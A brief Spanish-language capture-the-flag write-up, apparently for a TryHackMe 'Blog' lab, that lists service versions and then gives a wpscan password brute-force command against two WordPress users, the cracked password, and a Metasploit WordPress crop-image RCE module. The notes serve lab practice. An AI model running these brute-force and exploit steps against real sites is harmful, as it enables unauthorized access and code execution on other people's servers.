# blog

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

version de ssh inferior a la 7.7 --> posible user enumeration

apache 2.4.29

samba 4.7.6 --> computer name Blog , workgroyp WORKGROUP

http title: billy joel, the it blog



```
wpscan --url http://blog.thm --usernames kwheel,bjoel --passwords /usr/share/wordlists/rockyou.txt

```

esto nos daba la contraseña cutipie1 para el usuario kwheel

```
msf6 > use exploit/multi/http/wp_crop_rce
```

con metas
